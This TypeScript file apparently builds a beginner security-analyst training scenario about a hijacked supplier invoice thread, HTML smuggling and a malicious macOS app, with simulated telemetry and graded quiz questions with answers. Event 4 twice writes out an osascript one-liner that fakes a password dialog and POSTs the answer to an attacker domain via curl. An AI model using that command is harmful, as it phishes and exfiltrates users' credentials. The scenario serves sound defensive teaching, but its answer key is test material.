/**
 * Scenario pack: "Shared Invoice — Malicious Attachment via Google Workspace"
 *
 * BEGINNER tier. One user, one laptop, no lateral movement. The Google
 * Workspace equivalent of the Microsoft 365 macro scenarios, for estates that
 * run Gmail rather than Exchange Online.
 *
 * The teaching point is that Gmail DELIVERED this. The message passed SPF, DKIM
 * and DMARC — because the sender domain really did send it. It is a genuine
 * mailbox at a small supplier, compromised a week earlier, replying inside a
 * real invoice thread the recipient started. Every authentication signal an
 * analyst normally leans on is green, and every one of them is answering a
 * question ("did this domain authorise this message?") that a compromised
 * mailbox answers correctly.
 *
 * NOTE: `difficulty: "beginner"` is declared on the SCENARIOS registry entry in
 * scenarios.ts (ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildGwsPhishingAttachmentScenario(
  scenarioId = "gws-phishing-attachment-2026",
): ScenarioBundle {
  const B = new Date("2026-07-02T08:31:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-003", ip: "10.8.4.61" };
  const victim = { email: "s.amir@rocketstack.io", name: "Shira Amir", sam: "s.amir" };

  // A real supplier the company genuinely works with. The mailbox is
  // compromised; the domain is not spoofed.
  const supplier = { email: "billing@northline-print.co.uk", domain: "northline-print.co.uk" };

  const c2 = "doc-verify-cdn.com";

  const attachmentHash = makeSha256("northline_invoice_8842_html_smuggling_2026");
  const droppedHash    = makeSha256("invoice_8842_lnk_dropper_payload_2026");
  const chromeHash     = makeSha256("google_chrome_helper_signed_binary_2026");
  const osascriptHash  = makeSha256("macos_usr_bin_osascript_apple_signed");

  // EDR↔scenario integration (Phase 4): ONE incident spanning two planes — the
  // email/identity side (Google Workspace delivery inside a real supplier thread,
  // and the same attachment fanning out to other mailboxes) AND the host side
  // (macOS endpoint: mounted DMG → unnotarized app → osascript). edr_scope
  // "hybrid": the analyst pivots to EDR to walk the process tree on LAP-003 while
  // the mail-borne delivery and tenant spread are investigated on the GWS plane,
  // correlated by incident_id. Alert-grade EDR rows: the osascript execution crux
  // and the Falcon detection; the earlier EDR file/process events are pivot-only.
  const INCIDENT = "inc:gws:1";

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. Delivered. Authenticated. Inside a real thread.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_01_email_delivered",
      ts: T(0),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      user_email: victim.email,
      user_title: "Operations Lead",
      severity: "low",
      mitre_technique: "T1566.001",
      mitre_tactic: "Initial Access",
      description:
        "Gmail delivered a reply from billing@northline-print.co.uk into an existing invoice thread at 08:31, with one HTML attachment. SPF, DKIM and DMARC all passed.",
      raw: {
        "gws.event.type": "message_delivered",
        "gws.event.name": "email_log_search",
        "gws.message_id": "<CAF3n2rQ8xK9v@mail.northline-print.co.uk>",
        "gws.sender": supplier.email,
        "gws.recipient": victim.email,
        "gws.subject": "RE: PO-4417 — revised invoice attached",
        "gws.direction": "INBOUND",
        "gws.message_size_bytes": "241844",
        "gws.attachment.count": "1",
        "gws.attachment.0.name": "Invoice_8842.html",
        "gws.attachment.0.sha256": attachmentHash,
        "gws.attachment.0.mime_type": "text/html",
        "gws.spf_result": "PASS",
        "gws.dkim_result": "PASS",
        "gws.dkim_domain": supplier.domain,
        "gws.dmarc_result": "PASS",
        "gws.dmarc_policy": "quarantine",
        "gws.tls_encrypted": "true",
        "gws.spam_score": "0.4",
        "gws.classification": "INBOX",
        "gws.in_reply_to": "<CAB7k1pL2mN4t@mail.rocketstack.io>",
        "gws.thread_id": "thread-a4f1c9d20e",
        "event.action": "email-delivered",
        "event.outcome": "success",
        "user.email": victim.email,
      },
    },

    // ---------------------------------------------------------------------
    // 2. The user opens the attachment. Chrome writes a file to Downloads —
    //    the HTML built it locally rather than fetching it.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_02_attachment_opened",
      ts: T(14 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1027.006",
      mitre_tactic: "Defense Evasion",
      description:
        "At 08:45 Google Chrome wrote /Users/s.amir/Downloads/Invoice_8842.dmg, 4.1 MB, with no preceding download request in the network log.",
      file: {
        name: "Invoice_8842.dmg",
        path: "/Users/s.amir/Downloads/Invoice_8842.dmg",
        extension: "dmg",
        size: 4_294_967,
        sha256: droppedHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "FileWritten",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "file_created",
        "file.name": "Invoice_8842.dmg",
        "file.path": "/Users/s.amir/Downloads/Invoice_8842.dmg",
        "file.size": "4294967",
        "file.hash.sha256": droppedHash,
        "process.name": "Google Chrome",
        "process.pid": "4412",
        "process.executable": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "process.hash.sha256": chromeHash,
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 3. The image is mounted and the app inside it is launched.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_03_dmg_mount",
      ts: T(16 * MIN + 20_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1204.002",
      mitre_tactic: "Execution",
      description:
        "Finder mounted the disk image at 08:47:20 and launched Invoice Viewer.app from the mounted volume.",
      process: {
        name: "Invoice Viewer",
        pid: 5188,
        path: "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        parent_name: "Finder",
        parent_pid: 812,
        cmdline: "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        user: victim.sam,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "process_created",
        "process.name": "Invoice Viewer",
        "process.pid": "5188",
        "process.executable": "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        "process.parent.name": "Finder",
        "process.parent.pid": "812",
        "process.code_signature.status": "unsigned",
        "process.code_signature.notarized": "false",
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
      },
    },

    // ---------------------------------------------------------------------
    // 4. The "viewer" asks the OS to run a script — the classic macOS step.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_04_osascript",
      ts: T(16 * MIN + 24_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      mitre_technique: "T1059.002",
      mitre_tactic: "Execution",
      is_detection: true, // alert-grade: the behavioural crux — an unnotarized app spawning osascript to exfil a phished password
      description:
        "Four seconds later the app spawned /usr/bin/osascript running an AppleScript that presents a password dialog and pipes the answer to curl.",
      process: {
        name: "osascript",
        pid: 5203,
        path: "/usr/bin/osascript",
        parent_name: "Invoice Viewer",
        parent_pid: 5188,
        cmdline:
          "osascript -e 'display dialog \"Invoice Viewer requires your password to continue\" default answer \"\" with hidden answer' -e 'do shell script \"curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-\"'",
        user: victim.sam,
        integrity: "medium",
        hash: { sha256: osascriptHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: AppleScript",
        "crowdstrike.detection.technique_id": "T1059.002",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "2048",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "process_created",
        "process.name": "osascript",
        "process.pid": "5203",
        "process.executable": "/usr/bin/osascript",
        "process.command_line":
          "osascript -e 'display dialog \"Invoice Viewer requires your password to continue\" default answer \"\" with hidden answer' -e 'do shell script \"curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-\"'",
        "process.hash.sha256": osascriptHash,
        "process.code_signature.subject_name": "Software Signing",
        "process.code_signature.status": "trusted",
        "process.parent.name": "Invoice Viewer",
        "process.parent.pid": "5188",
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
      },
    },

    // ---------------------------------------------------------------------
    // 5. The outbound POST is refused at the perimeter.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_05_c2_blocked",
      ts: T(16 * MIN + 25_000),
      source: "firewall",
      vendor: "Fortinet FortiGate",
      event_type: "http_blocked",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1041",
      mitre_tactic: "Exfiltration",
      description:
        "The POST to doc-verify-cdn.com/v/1 was denied by the web filter under the category Newly Observed Domain.",
      network: { url: `https://${c2}/v/1`, domain: c2, method: "POST", status: 0 },
      raw: {
        "data.type": "utm",
        "data.subtype": "webfilter",
        "data.level": "warning",
        "data.logid": "0316013056",
        "data.vd": "root",
        "data.action": "blocked",
        "data.policyid": "17",
        "data.srcip": host.ip,
        "data.srcname": host.hostname,
        "data.dstip": "23.129.64.211",
        "data.dstport": "443",
        "data.hostname": c2,
        "data.url": "/v/1",
        "data.method": "POST",
        "data.catdesc": "Newly Observed Domain",
        "data.cat": "90",
        "data.msg": "URL belongs to a denied category in policy",
        "data.eventtime": String(new Date(T(16 * MIN + 25_000)).getTime() * 1_000_000),
        "rule.id": "81605",
        "rule.level": "6",
        "rule.description": "FortiGate: Web filter blocked URL",
        "rule.groups": ["fortigate", "webfilter"],
      },
    },

    // ---------------------------------------------------------------------
    // 6. Falcon's verdict on the chain.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_06_edr_alert",
      ts: T(17 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      is_detection: true,    // the Falcon detection — the endpoint alert that opens the ticket
      edr_scope: "hybrid",   // spans host (macOS execution chain) + email/identity (GWS delivery + tenant spread) → pivot to EDR for the host
      description:
        "Falcon raised a Critical detection on LAP-003 for an unnotarized app from a mounted volume spawning osascript, and killed the osascript process.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "UnnotarizedAppSpawnsScriptInterpreter",
        "crowdstrike.detection.description":
          "An unsigned application launched from a mounted disk image spawned osascript with an embedded shell command to a remote host.",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.confidence": "95",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: AppleScript",
        "crowdstrike.detection.technique_id": "T1059.002",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.detection.process_tree": "Finder > Invoice Viewer > osascript",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "alert",
        "event.outcome": "blocked",
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
        "user.name": victim.sam,
      },
    },

    // ---------------------------------------------------------------------
    // 7. Mail-log context: this sender is real, and this is the first
    //    attachment they have ever sent that was not a PDF.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_07_sender_history",
      ts: T(22 * MIN),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      user_email: victim.email,
      severity: "medium",
      description:
        "A mail-log search for this sender returns 41 delivered messages over 14 months, all authenticated, with attachment types recorded.",
      raw: {
        "gws.event.type": "email_log_search",
        "gws.query.sender": supplier.email,
        "gws.query.window_days": "420",
        "gws.result.message_count": "41",
        "gws.result.first_seen": "2025-05-08T09:12:00Z",
        "gws.result.recipients": ["s.amir@rocketstack.io", "finance@rocketstack.io"],
        "gws.result.spf_pass_rate": "41/41",
        "gws.result.dmarc_pass_rate": "41/41",
        "gws.result.attachment_types_seen": ["application/pdf"],
        "gws.result.attachment_types_seen_last_30d": ["application/pdf", "text/html"],
        "gws.result.html_attachments_before_today": "0",
        "event.action": "log-search",
        "event.outcome": "success",
      },
    },

    // ---------------------------------------------------------------------
    // 8. The same HTML attachment went to two other mailboxes in the tenant.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_08_tenant_spread",
      ts: T(24 * MIN),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      severity: "high",
      description:
        "A search on the attachment hash finds the same file delivered to two further mailboxes in the tenant this morning, both still unopened.",
      raw: {
        "gws.event.type": "email_log_search",
        "gws.query.attachment_sha256": attachmentHash,
        "gws.result.message_count": "3",
        "gws.result.recipients": [
          "s.amir@rocketstack.io",
          "finance@rocketstack.io",
          "d.shapira@rocketstack.io",
        ],
        "gws.result.senders": [supplier.email],
        "gws.result.delivered_between": ["2026-07-02T08:31:00Z", "2026-07-02T08:36:00Z"],
        "gws.result.opened_count": "1",
        "gws.result.classification": "INBOX",
        "event.action": "log-search",
        "event.outcome": "success",
      },
    },
  ];

  // Every event — host EDR chain and GWS email plane alike — belongs to the one
  // phishing-attachment incident (the SIEM↔EDR correlation key).
  for (const e of events) e.incident_id = INCIDENT;

  const iocs: IOC[] = [
    {
      type: "sha256",
      value: attachmentHash,
      first_seen: T(0),
      last_seen: T(24 * MIN),
      reputation: "malicious",
      tags: ["html-smuggling", "email-attachment"],
    },
    {
      type: "sha256",
      value: droppedHash,
      first_seen: T(14 * MIN),
      last_seen: T(16 * MIN + 20_000),
      reputation: "malicious",
      tags: ["macos", "dmg", "dropper"],
    },
    {
      type: "domain",
      value: c2,
      first_seen: T(16 * MIN + 25_000),
      last_seen: T(16 * MIN + 25_000),
      reputation: "malicious",
      tags: ["c2", "newly-observed"],
    },
    {
      // A real supplier whose mailbox is compromised. Blocking the domain
      // outright would cut off genuine invoicing — this needs a phone call,
      // not a blocklist entry.
      type: "email",
      value: supplier.email,
      first_seen: T(0),
      last_seen: T(24 * MIN),
      reputation: "suspicious",
      tags: ["compromised-supplier-mailbox", "thread-hijack"],
    },
    {
      type: "host",
      value: host.hostname,
      first_seen: T(14 * MIN),
      last_seen: T(17 * MIN),
      reputation: "unknown",
      tags: ["user-endpoint", "macos", "affected"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "SPF, DKIM and DMARC all returned PASS. What does that actually tell you about this message?",
      hint: "Compare the sender in evt_gws_01 with the sender history in evt_gws_07.",
      kind: "single",
      options: [
        { value: "domain_authorised", label: "The domain genuinely authorised the message — which a compromised mailbox does too" },
        { value: "safe", label: "The message is legitimate; all three passing means the content has been verified" },
        { value: "spoofed", label: "The results were forged by the sender along with the message headers" },
        { value: "misconfig", label: "The tenant's DMARC policy is misconfigured, since a malicious message passed it" },
      ],
      answer: "domain_authorised",
      xp: 50,
      explanation:
        "SPF, DKIM and DMARC answer one question between them: was this message sent with the domain owner's authorisation? Here the honest answer is yes — it was sent from northline-print.co.uk's own infrastructure, by someone holding the credentials to a real mailbox there. None of the three inspects content, intent or attachments, which is why (b) is the assumption that gets people phished. The results cannot be forged by the sender (c) because they are computed by the receiving server against DNS the sender does not control. And the policy is not misconfigured (d) — it is working exactly as designed against a threat it was never designed to catch.",
    },
    {
      id: "q2",
      prompt:
        "The .dmg appeared in Downloads with no matching download request in the firewall log. What does that indicate?",
      kind: "single",
      options: [
        { value: "smuggling", label: "The HTML attachment carried the payload as data and assembled the file in the browser (HTML smuggling)" },
        { value: "missing_logs", label: "Firewall logging was down during that window, so the download was simply not recorded" },
        { value: "usb", label: "The file arrived by some other route — a USB stick or an AirDrop transfer" },
        { value: "cached", label: "The file was served from the browser cache after an earlier visit" },
      ],
      answer: "smuggling",
      xp: 60,
      explanation:
        "The attachment is text/html and 241 KB — large for a message body, and exactly the shape of a file with an encoded blob inside it. When the user opens it, script in the page reconstructs the binary locally and hands it to the browser as a download, so the bytes never cross the network as a fetchable file. That is HTML smuggling (T1027.006), and it is specifically designed to defeat perimeter file inspection. Option (b) is contradicted by the same firewall logging a block four seconds later in evt_gws_05. Option (c) ignores that Chrome is the process that wrote the file, recorded in the raw event.",
    },
    {
      id: "q3",
      prompt:
        "osascript is a signed Apple binary (code_signature.status: trusted). Why did Falcon treat evt_gws_04 as Critical anyway?",
      kind: "single",
      options: [
        { value: "parent_and_cmd", label: "Its parent was an unnotarized app on a mounted volume, and its command line pipes a password prompt to a remote host" },
        { value: "signature", label: "Apple had revoked the signature on this build of osascript" },
        { value: "root", label: "It ran as root, which osascript never does legitimately" },
        { value: "hash", label: "The binary's hash did not match Apple's published value, so it had been tampered with" },
      ],
      answer: "parent_and_cmd",
      xp: 60,
      explanation:
        "The binary is fine; what it was asked to do is not. Two things make it Critical. Its parent is an unsigned, unnotarized application running from /Volumes — a disk image the user mounted minutes earlier — and its arguments build a hidden-answer password dialog and pipe whatever is typed straight into a curl POST to an external host. Living-off-the-land is exactly this: legitimate tooling used for illegitimate purposes, so a detection that only asks 'is this binary signed' catches nothing. Options (b) and (d) are contradicted by the log, which shows a trusted Apple signature. Option (c) is wrong on the evidence — the process ran at medium integrity as the user, not as root.",
    },
    {
      id: "q4",
      prompt:
        "Given evt_gws_07 and evt_gws_08, what should happen beyond containing LAP-003?",
      kind: "single",
      options: [
        { value: "purge_and_call", label: "Purge the two unopened copies from the tenant, and contact the supplier out-of-band — their mailbox is compromised" },
        { value: "block_domain", label: "Block northline-print.co.uk at the mail gateway so no further messages arrive" },
        { value: "reply", label: "Reply to the message asking the supplier to confirm whether they sent it" },
        { value: "nothing", label: "Nothing — the payload was blocked, so the other copies pose no risk" },
      ],
      answer: "purge_and_call",
      xp: 50,
      explanation:
        "evt_gws_08 shows the same attachment sitting unopened in two other mailboxes, so there is live exposure to remove — and 'the payload was blocked' (d) only describes what happened on the one host where a user opened it. The supplier needs telling, but not by replying to the thread (c): the attacker is reading that mailbox, and a reply tips them off and reaches them rather than the supplier. Use a phone number you already have on file. Blocking the domain (b) is the tempting reflex and the wrong one — it severs genuine invoicing with a real business partner to solve a problem that a purge plus a phone call solves better, and it does nothing about the mailbox actually being under someone else's control.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Shared Invoice — Malicious Attachment via Google Workspace",
    threat_actor: "Business email compromise operator (supplier thread hijack)",
    attack_kind: "gws_phishing_attachment",
    briefing:
      "CrowdStrike Falcon raised a Critical detection on LAP-003 at 08:48 for osascript spawned by an unsigned app. The user had just opened an invoice from a supplier. Establish how the file reached the machine and what else in the tenant is affected.",
    narrative: `At 08:31 Gmail delivered a reply into an invoice thread Shira Amir had started herself. It came from billing@northline-print.co.uk — a print supplier RocketStack has worked with for fourteen months — and it carried one attachment, Invoice_8842.html. SPF passed. DKIM passed against northline-print.co.uk. DMARC passed. The spam score was 0.4 and the message went straight to the inbox, which is the correct outcome: the domain really did authorise this message, because it was sent from a genuine mailbox by whoever now controls it.

She opened the attachment at 08:45. Four seconds later Chrome wrote a 4.1 MB file, Invoice_8842.dmg, into her Downloads folder — and there is no corresponding download in the firewall log, because there was no download. The HTML carried the payload as encoded data and assembled it in the browser.

At 08:47:20 Finder mounted the image and she launched "Invoice Viewer.app" from the volume. It is unsigned and unnotarized. Four seconds after that it spawned /usr/bin/osascript — a legitimate, Apple-signed binary — with an AppleScript that puts up a hidden-answer password dialog and pipes the answer into a curl POST to doc-verify-cdn.com.

That POST never left. FortiGate blocked it under Newly Observed Domain, and Falcon killed the osascript process on the same detection. Whether she typed her password before it died is not recorded anywhere in this telemetry.

Two facts remain open. The sender has delivered 41 authenticated messages over fourteen months and every attachment before today was a PDF. And the same HTML file was delivered to two other mailboxes in the tenant between 08:31 and 08:36, both still unopened.`,
    learning_objectives: [
      "State precisely what SPF, DKIM and DMARC verify, and why a compromised mailbox passes all three",
      "Recognise HTML smuggling (T1027.006) from a file appearing on disk with no matching network download",
      "Explain why a signed system binary can still be the malicious step in a chain",
      "Use mail-log search on sender history and attachment hash to scope exposure across a tenant",
      "Choose a response for a compromised supplier that preserves the business relationship and does not tip off the attacker",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Initial Access", action: "Authenticated reply from a compromised supplier mailbox, delivered to the inbox (T1566.001)" },
      { ts: T(14 * MIN), phase: "Defense Evasion", action: "HTML attachment assembles Invoice_8842.dmg locally in the browser (T1027.006)" },
      { ts: T(16 * MIN + 20_000), phase: "Execution", action: "User mounts the image and launches the unnotarized app (T1204.002)" },
      { ts: T(16 * MIN + 24_000), phase: "Execution", action: "App spawns osascript with a credential-prompt-to-curl one-liner (T1059.002)" },
      { ts: T(16 * MIN + 25_000), phase: "Exfiltration", action: `POST to ${c2} blocked by the web filter` },
      { ts: T(17 * MIN), phase: "Containment", action: "Falcon kills osascript and raises a Critical detection" },
      { ts: T(22 * MIN), phase: "Scoping", action: "Sender history shows 41 authenticated messages, PDFs only until today" },
      { ts: T(24 * MIN), phase: "Scoping", action: "Same attachment found unopened in two further tenant mailboxes" },
    ],
    questions,
  };
}
